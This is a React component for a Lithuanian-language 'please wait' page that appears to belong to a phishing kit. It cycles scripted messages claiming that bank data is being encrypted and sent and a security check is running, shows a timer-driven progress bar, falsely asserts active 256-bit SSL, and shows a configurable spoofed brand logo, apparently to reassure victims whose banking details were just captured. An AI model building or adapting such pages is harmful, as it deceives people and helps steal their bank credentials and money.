"use client";

import { useEffect, useState } from "react";
import { DemoShell } from "@/components/demo/DemoShell";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
  routeSessionId?: string | null;
};

const MESSAGES = [
  "Užmezgamas saugus ryšys...",
  "Banko duomenys užšifruojami ir siunčiami...",
  "Atliekamas saugumo patikrinimas...",
  "Prašome palaukti...",
  "Ryšys autorizuojamas..."
];

async function resolveShortIdApi(sessionId: string): Promise<string | null> {
  try {
    const res = await fetch(`/api/resolve-short-id`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId }),
      cache: "no-store",
    });
    if (!res.ok) return null;
    const json = await res.json();
    if (json?.ok && json?.public_id) return String(json.public_id);
    return null;
  } catch {
    return null;
  }
}

export function WaitClient({ sessionId, routeSessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();
  const [messageIndex, setMessageIndex] = useState(0);

  // Client-side URL normalizasyonu: URL query param session UUID ise kisa ID'ye cevir
  useEffect(() => {
    if (typeof window === "undefined") return;
    let cancelled = false;

    const run = async () => {
      const url = new URL(window.location.href);
      const sessionQp = url.searchParams.get("session");
      const hasUuidQp =
        sessionQp &&
        /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          sessionQp,
        );

      if (!hasUuidQp) return;

      const sid = sessionQp!;
      const preferred =
        routeSessionId &&
        !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          routeSessionId,
        )
          ? routeSessionId
          : null;

      const shortId = preferred ?? (await resolveShortIdApi(sid));
      if (cancelled) return;
      if (shortId && shortId !== sid) {
        url.searchParams.set("session", shortId);
        const next = url.pathname + url.search + url.hash;
        window.history.replaceState({}, "", next);
      }
    };

    run();
    return () => {
      cancelled = true;
    };
  }, [sessionId, routeSessionId]);

  useEffect(() => {
    const messageTimer = setInterval(() => {
      setMessageIndex((prev) => (prev + 1) % MESSAGES.length);
    }, 3500);
    return () => clearInterval(messageTimer);
  }, []);

  const progressWidth = ((messageIndex + 1) / MESSAGES.length) * 100;


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
        </div>
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      <main className="flex w-full flex-col items-center justify-center p-0">
        {!sessionId ? (
          <div className="flex w-full justify-center">
            <p className="w-full max-w-sm rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400 shadow-sm">
              Neteisinga nuoroda.
            </p>
          </div>
        ) : (
          <div className="pak-form-card fade-in mx-auto flex w-full max-w-[760px] flex-col overflow-hidden">
            <div className="pak-form-inner px-6 pb-8 pt-8 sm:px-10 sm:pb-10 sm:pt-10">
              <div className="mx-auto mb-6 flex w-full max-w-[560px] items-start justify-between gap-4">
                <div>
                  <h2 className="pak-form-title max-w-[14ch]">{settings.wait_title}</h2>
                  <p className="pak-form-subtitle mt-3 max-w-[32rem]">
                    Jūsų patvirtinimas saugiai apdorojamas, tikrinamas ryšys.
                  </p>
                </div>
                <img
                  src={settings.logo_url || "/form-assets/iki-mini-logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="pak-form-brand-logo shrink-0"
                />
              </div>

              <div className="mx-auto flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#4ade80]/30 bg-[radial-gradient(circle_at_top,rgba(74,222,128,0.13),transparent_55%),linear-gradient(180deg,rgba(8,24,14,0.96),rgba(5,12,8,0.98))] px-6 py-8 shadow-[inset_0_1px_0_rgba(74,222,128,0.08)]">
                <div className="relative mb-6 flex h-28 w-28 items-center justify-center">
                  <div className="absolute inset-0 rounded-full border border-[#4ade80]/20" />
                  <div className="absolute inset-[10px] rounded-full border border-[#4ade80]/20" />
                  <div className="absolute inset-0 animate-spin rounded-full border-[3px] border-transparent border-t-[#4ade80] border-r-[#4ade80]" style={{ animationDuration: "1.7s" }} />
                  <div className="absolute inset-[20px] rounded-full bg-[#4ade80]/12 blur-md" />
                  <svg className="relative z-10 h-11 w-11 text-[#4ade80]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="m8.8 11.8 2.1 2.1 4.5-4.7" />
                  </svg>
                </div>

                <div className="mb-6 min-h-[52px] px-3 text-center">
                  <p key={messageIndex} className="text-base font-semibold leading-6 text-white/82 animate-[fadeIn_0.5s_ease-in-out]">
                    {MESSAGES[messageIndex]}
                  </p>
                </div>

                <div className="w-full">
                  <div className="mb-2 flex items-center justify-between text-[11px] font-bold uppercase tracking-[0.14em] text-[#4ade80]/85">
                    <span>Verifikacija</span>
                    <span>{Math.round(progressWidth)}%</span>
                  </div>
                  <div className="h-3 overflow-hidden rounded-full border border-[#4ade80]/30 bg-black/30">
                    <div
                      className="relative h-full rounded-full bg-[linear-gradient(90deg,#0fae4e_0%,#4ade80_60%,#4ade80_100%)] transition-all duration-1000 ease-in-out"
                      style={{ width: `${progressWidth}%` }}
                    >
                      <div className="absolute inset-y-0 right-0 w-16 bg-white/30 blur-md" />
                    </div>
                  </div>
                </div>

                <div className="mt-8 pak-form-security justify-center text-center">
                  <svg className="h-8 w-8 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                    <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  <span>256 bitų SSL šifravimas aktyvus</span>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
